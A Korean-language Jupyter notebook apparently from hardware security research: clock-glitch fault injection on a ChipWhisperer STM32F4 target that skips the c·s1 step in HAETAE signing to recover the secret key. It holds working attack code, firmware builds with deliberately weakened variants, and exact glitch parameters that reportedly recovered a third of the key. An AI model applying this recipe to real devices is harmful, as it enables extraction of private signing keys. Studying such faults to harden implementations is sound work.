# HAETAE F4 — T1 (c·s 스킵 → z=y) 축 A 클럭글리치 실험  [1·2·3단계 / 모니터링판]

**이 노트북을 위→아래로 실행.** EXP7-a 리그를 그대로 임베드한 자체완결 T1 노트북.

- **T1**: `c·s1` 을 스킵 → `z=y1`(nonce). 깨끗한 `z_clean` 과 차분 `z_clean−z_fault=(-1)^b·LN·c·s1` → 공개 `c` 로 NTT 역변환 → `s1`.
- **성공(‘s값까지’)**: 디바이스 참 `s1`(‘s’스트림)과 **계수단위 768/768 정확 일치**.
- **라이브 모니터링**: `live_every`(기본25) 주기로 (ext,width)산점도+진행+누설 갱신. 느리면 `live_every=0`.

| 단계 | y 추출 | hex | 기대 |
|---|---|---|---|
| **1** | SW모델(FL_CS) | `haetae-baseline-FSIM` | 복원체인 y→cs→s **768/768** 확정 (글리치X) |
| **2** | 물리 글리치 | `haetae-baseline-FSIM` (미수정) | 대부분 `other` = **미수정 레퍼런스 물리 T1 저항** |
| **3a**| 물리 글리치(fast) | `haetae-JIG-T1-fused` (EDIT1+2) | **실HW 부분복원 33% 실증**(loop-abort iter2→block3). 진입밴드 타격 시 **768/768** |
| **3b**| 물리 글리치(교차) | `haetae-baseline-FSIM-T1` (EDIT1) | full-sign 교차검증(느림, diff%LN 자기게이트) |

**전제**: `Python (aifia)` 커널, Husky+CW308_STM32F4 연결. hex 3종은 **이미 빌드·배치됨**(아래 0절은 재빌드용).


## 0) 펌웨어 hex — **이미 빌드·배치 완료** (재빌드가 필요할 때만 실행)
모두 매크로 가드라 레퍼런스 기본 빌드는 바이트동일. `T1_CS_ZEROINIT`=cs 사전0화(EDIT1), `AXISA_JIG`=fire_t1(EDIT2).

In [ ]:
%%bash
cd /mnt/c/Users/NSRSGW/ChipWhisperer/chipwhisperer/firmware/mcu/simpleserial-haetae
B='PLATFORM=CW308_STM32F4 CRYPTO_TARGET=NONE SS_VER=SS_VER_1_1 VARIANT=baseline'
# 1·2단계: 미수정 FSIM
make clean $B FAULT_SIM=1 >/dev/null 2>&1 && make $B FAULT_SIM=1 >/dev/null 2>&1 && \
  cp simpleserial-haetae-CW308_STM32F4.hex haetae-baseline-FSIM-CW308_STM32F4.hex && echo 'OK FSIM'
# 3a: jig 클린 (EDIT1+2)
make clean $B AXISA_JIG=1 T1_CS_ZEROINIT=1 >/dev/null 2>&1 && make $B AXISA_JIG=1 T1_CS_ZEROINIT=1 >/dev/null 2>&1 && \
  cp simpleserial-haetae-CW308_STM32F4.hex haetae-JIG-T1-fused-CW308_STM32F4.hex && echo 'OK JIG-T1'
# 3b: full-sign 클린 (EDIT1)
make clean $B FAULT_SIM=1 T1_CS_ZEROINIT=1 >/dev/null 2>&1 && make $B FAULT_SIM=1 T1_CS_ZEROINIT=1 >/dev/null 2>&1 && \
  cp simpleserial-haetae-CW308_STM32F4.hex haetae-baseline-FSIM-T1-CW308_STM32F4.hex && echo 'OK FSIM-T1'
ls -la haetae-*T1*.hex haetae-baseline-FSIM-CW308_STM32F4.hex


## 1) 부트스트랩 — EXP7-a 그대로 (scope/target/flash/set_glitch/glitch_once/ss_trig/FL/SIGN_MS/PLATFORM)

In [ ]:
# ===== EXP7-a: 단독 부트스트랩 + '공격지점=트리거지점' 셋업 =====
%matplotlib inline
SCOPETYPE='OPENADC'; PLATFORM='CW308_STM32F4'; CRYPTO_TARGET='NONE'; SS_VER='SS_VER_1_1'
import chipwhisperer as cw
import numpy as np, time, struct, csv, collections, logging, random
logging.getLogger('ChipWhisperer').setLevel(logging.ERROR)
try:
    scope
except NameError:
    scope = cw.scope(name='Husky')
%run "../../Setup_Scripts/Setup_Generic.ipynb"

scope.clock.clkgen_freq = 7.37e6; scope.clock.adc_mul = 1; scope.io.hs2 = 'clkgen'
time.sleep(0.2)
import importlib, haetae_recover; importlib.reload(haetae_recover)
from haetae_recover import attack_recover

FW = '../../../firmware/mcu/simpleserial-haetae/'
FL = {'NONE':0,'SEED':1,'SIGNBIT':2,'UNPACK':3,'LSB':4,'CS':5,'ADDY':6,'REJECT':7}
GOLDEN  = bytes.fromhex('ba9f152c607b207fc6512635ba11388c')   # 무결함 서명(결정론)
LEAK_T2 = bytes.fromhex('63ff5ebfaa6263739651890939cccb48')   # T2 클린스킵 누설(+y 전체 skip → z=LN·c·s1)
LEAK_TH = 0.99                # LEAK 판정 임계(s1 복원율). 부분누설만 보려면 낮춰 재실행
SIGN_MS = 15000              # ★ full-sign 응답 대기(ms). 서명 ~8초라 넉넉히. glitch_once 의 정상프레임 read timeout
TRIG_POINT = FL['ADDY']       # ★ 공격지점=트리거지점. ADDY=T2(+y) / CS=T1 / REJECT=RB / 0=전체

def ss_echo(timeout=3000):
    target.flush(); target.simpleserial_write('e', bytearray())
    r = target.simpleserial_read('r', 16, timeout=timeout); return bytes(r) if r else None
def ss_sign(timeout=90000):
    target.flush(); target.simpleserial_write('p', bytearray([0]*16))
    r = target.simpleserial_read('r', 16, timeout=timeout); return bytes(r) if r else None
def set_fault(line, oneshot=0, checkskip=0):
    target.flush(); target.simpleserial_write('f', bytes([line, oneshot, checkskip]))
    return target.simpleserial_read('r', 1, timeout=3000)
def ss_trig(pt):
    target.flush(); target.simpleserial_write('T', bytes([pt]))
    return target.simpleserial_read('r', 1, timeout=3000)
def flash(hexname):
    cw.program_target(scope, prog, FW + hexname); reset_target(scope); time.sleep(0.5); target.flush()
def recover_target():                       # 리셋 후 트리거지점 재설정(리셋이 g_trig_line 초기화)
    reset_target(scope); time.sleep(0.5); target.flush()
    try: ss_trig(TRIG_POINT)
    except Exception: pass

# 플래시(clean clock) + SW결함 OFF + 워밍업(키생성) + GOLDEN 확인
scope.io.hs2 = 'clkgen'
flash('haetae-baseline-FSIM-{}.hex'.format(PLATFORM))
set_fault(FL['NONE'], 0, 0)
g = ss_sign()
print('echo:', (ss_echo() or b'').hex()[:8], '| sign:', g.hex() if g else None)
assert g == GOLDEN, 'GOLDEN 불일치! 펌웨어/키 확인 (volatile 가드 적용 후 BUILD 셀로 재빌드했는지 확인)'
pt_name = [k for k,v in FL.items() if v==TRIG_POINT][0]
print('trig set:', (ss_trig(TRIG_POINT) or b'').hex(), '( 지점 =', pt_name, ')')

# (1) 트리거 윈도우 측정 — TRIG_POINT 연산만 → 작게
scope.adc.basic_mode='rising_edge'
try: scope.trigger.triggers='tio4'
except Exception: pass
scope.adc.timeout = 12
scope.arm(); target.simpleserial_write('p', bytearray([0]*16))
to = scope.capture(); WIN = int(scope.adc.trig_count)
target.simpleserial_read('r', 16, timeout=20000)
print('WIN(%s만) = %d 타겟 사이클 | timeout? %s' % (pt_name, WIN, to))

# (2) 클럭글리치 모드 + 리셋 + 트리거지점 재설정
scope.glitch.enabled = True
scope.glitch.clk_src = 'pll'; scope.glitch.output = 'clock_xor'
scope.glitch.trigger_src = 'ext_single'; scope.glitch.repeat = 1
scope.io.hs2 = 'glitch'; scope.adc.timeout = 3
time.sleep(0.2); reset_target(scope); time.sleep(0.5); target.flush(); ss_trig(TRIG_POINT)
PSS = scope.glitch.phase_shift_steps
print('glitch 모드 | echo:', (ss_echo() or b'').hex()[:8], '| PSS =', PSS)

def set_glitch(delay, width, offset):
    scope.glitch.ext_offset = int(delay); scope.glitch.width = int(width); scope.glitch.offset = int(offset)

def glitch_once(read_timeout=SIGN_MS):
    # ext_single → 글리치는 하드웨어 트리거에 자동 발사. 시리얼 먼저 읽고 capture는 뒤(정리용).
    if scope.adc.state:                     # 직전 샷 트리거가 아직 high = 크래시. arm 전 빠른 리셋
        recover_target()
    scope.arm(); target.flush(); target.simpleserial_write('p', bytearray([0]*16))
    # ★ 핵심: 정상 프레임 읽기 timeout 에 서명시간(≈8초)을 줘야 함. 기본 250ms면 매번 오독→mute.
    #   glitch_timeout 은 프레임이 깨졌을 때(크래시) 잔여 바이트 수거용(짧게).
    r = target.simpleserial_read_witherrors('r', 16, timeout=read_timeout, glitch_timeout=1500)
    try: scope.capture()
    except Exception: pass
    if (not r['valid']) or r['payload'] is None:
        if ss_echo(800) is None: recover_target()
        else: target.flush()
        return 'mute', None
    p = bytes(r['payload'])
    return ('normal', p) if p == GOLDEN else (('success', p) if p == LEAK_T2 else ('other', p))

def recover_agreement():                    # 결함 응답 z1 → s1 복원율(0~1). 느림(z1/s1/c 스트리밍) → 후보에만 호출
    try: return float(attack_recover(target)['agreement'])
    except Exception: return 0.0

def classify_shot(g, p, recover_other=False):
    """glitch_once 결과 → (cls, agr). success(=exact LEAK_T2, +y 전체 clean skip)만 복원 확정.
       recover_other=True 면 'other'도 복원해 부분누설(agr>=LEAK_TH)을 LEAK로 승격."""
    if g == 'mute':    return 'mute', None
    if g == 'normal':  return 'golden', None
    if g == 'success': return 'LEAK', recover_agreement()
    if recover_other:
        agr = recover_agreement()
        return ('LEAK' if agr >= LEAK_TH else 'faulty'), agr
    return 'faulty', None

print('준비 완료 — EXP7-b2(진단) 또는 EXP7-b(랜덤) 실행')

## 2) T1 트리거(c·s) 선택 + 드라이버 로드

In [ ]:
TRIG_POINT = FL['CS']      # 트리거지점 = c·s (T1)
recover_target()
print('TRIG_POINT =', TRIG_POINT, '(FL_CS)')

In [ ]:
%run -i exp7_t1_driver.py

## 단계 1 · 복원 체인 확정 (글리치 없음, 즉시)
SW T1 모델(FL_CS)로 실디바이스 z_clean−z_fault 차분 → cs → s 역산 → 참키 768/768.

In [ ]:
validate_t1_chain_sw(hexname='haetae-baseline-FSIM-CW308_STM32F4.hex', tries=8)

## 단계 2 · 물리 클럭글리치 (baseline, 라이브 모니터링)
미수정 baseline → c·s 스킵=쓰레기 → `diff%LN` 게이트가 걸러 대부분 `other` = **물리 T1 저항**.
샷당 전체서명 ~8s 로 느림 → 먼저 `N=60` 으로 감 잡기 권장.

In [ ]:
run_t1_fullsign(hexname='haetae-baseline-FSIM-CW308_STM32F4.hex', N=60, live_every=20)

## 단계 3a · 물리 클린 누설 — fast-jig (권장)
`haetae-JIG-T1-fused` = EDIT1(cs 사전0화)+EDIT2(fire_t1). fire ~26ms, **동일 nonce 보장**.

**2026-07-18 발견**: 실HW 클럭글리치로 **비밀키 1/3 블록 복원(best s1=33.3%)** 실증.
`c·s1`은 3-반복 루프(블록 s1[0..2]) → 글리치가 **루프를 도중에 clean-exit**시키면 남은 블록이 0(사전0화)로 남아
차분에서 그 블록만 깨끗이 복원됨. 관측: `ext≈41,450 · width 56~67 · offset 13 · repeat 2` → iter2 직후 종료 → block3(33%).
- **iter2 직후**(ext≈41,450) → 33% · **iter1 직후**(더 작은 ext) → 67% · **루프 진입 전**(가장 작은 ext) → **100%(T1_leak)**.
- 아래는 승리 shape(o≈13·rep2·w50~70) 고정 + ext 0~42000 조밀 스캔 → **진입 밴드(100%)** 탐색.

> ⚠ 드라이버를 수정하면 반드시 `%run -i exp7_t1_driver.py` **재로드**(capture-first 속도패치 반영, 샷 3.3s→~0.1s).

In [ ]:
# 진입 밴드(100%) 탐색: 승리 shape 고정 + ext 0~42000 조밀 스캔
run_t1_jig(hexname='haetae-JIG-T1-fused-CW308_STM32F4.hex',
           N=800, E_MIN=0, E_MAX=42000,
           W_RANGE=(50,70), O_RANGE=(11,15), REP_POOL=(2,), live_every=0)

**결과 분석** — ext 1만 단위로 결과 분포(‘other’/‘T1_leak’ 몰리는 곳 = 루프 경계). 부분누설(agr>0.05)의 ext 위치로 진입 밴드 추정.

In [ ]:
import csv, collections
b = collections.defaultdict(collections.Counter); part = []
for r in csv.DictReader(open('t1_jig.csv')):
    b[int(r['ext'])//10000*10000][r['class']] += 1
    if r['agreement'] and float(r['agreement']) > 0.05:
        part.append((int(r['ext']), int(r['width']), int(r['offset']), int(r['repeat']), float(r['agreement'])))
for k in sorted(b): print('%7d~ %s' % (k, dict(b[k])))
print('부분/완전 누설(agr>0.05), ext 오름차순:')
for p in sorted(part): print('  ext=%d w=%d o=%d rep=%d  s1=%.1f%%' % (p[0],p[1],p[2],p[3],100*p[4]))

## 단계 3b · 물리 클린 누설 — full-sign 교차검증 (선택)
`haetae-baseline-FSIM-T1` = EDIT1 만. full-sign 경로라 느리고, 거부루프 발산 시 `diff%LN` 자기게이트로 걸러짐.

In [ ]:
# run_t1_fullsign(hexname='haetae-baseline-FSIM-T1-CW308_STM32F4.hex', N=200, live_every=20)

## 결과 확인 (CSV 요약 + 저장된 맵)

In [ ]:
from IPython.display import Image, display
import os, csv, collections
def inspect(out):
    if not os.path.exists(out + '.csv'): print(out, '(없음)'); return
    cnt = collections.Counter(); best = 0.0
    for r in csv.DictReader(open(out + '.csv')):
        cnt[r['class']] += 1
        try: best = max(best, float(r['agreement']) if r['agreement'] else 0.0)
        except Exception: pass
    print(out, '=>', dict(cnt), '| best s1=%.1f%%' % (100 * best))
    if os.path.exists('fig_%s_map.png' % out): display(Image('fig_%s_map.png' % out))
for o in ('t1_fullsign', 't1_jig'): inspect(o)

## 재현 검증 (발견 파라미터 K회 + s값 정밀검증)

In [ ]:
# 위 분석에서 T1_leak(또는 최고 agr) 파라미터로 K회 재현. 예(승리 shape 기준):
# verify_t1_leak(<진입밴드 ext>, 60, 13, 2, K=30, path='jig')